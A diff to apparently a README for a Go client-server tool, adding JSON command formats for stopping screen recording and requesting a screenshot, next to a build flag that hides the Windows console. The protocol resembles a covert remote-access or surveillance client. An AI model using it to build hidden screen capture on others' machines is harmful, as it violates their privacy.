@@ -87,11 +87,27 @@ go build -ldflags -H=windowsgui main.go
 // @cmd: the command
 // @action: the command action
 // @action_status: the status of the action
+// @seconds: must be null if you want to stop recording
 {
 	"reqid": 			"123456",
 	"cmd": 				"screen",
 	"action": 			"record",
-	"action_status": 	"stop"
+	"action_status": 	"stop",
+	"seconds": 			null
+}
+
+// Request a client to send a screenshot
+// @reqid: request ID from server
+// @cmd: the command
+// @action: the command action
+// @action_status: the status of the action
+// @seconds: must be null if you want to stop recording
+{
+	"reqid": 			"123456",
+	"cmd": 				"screen",
+	"action": 			"screenshot",
+	"action_status": 	null,
+	"seconds": 			null
 }
 
 
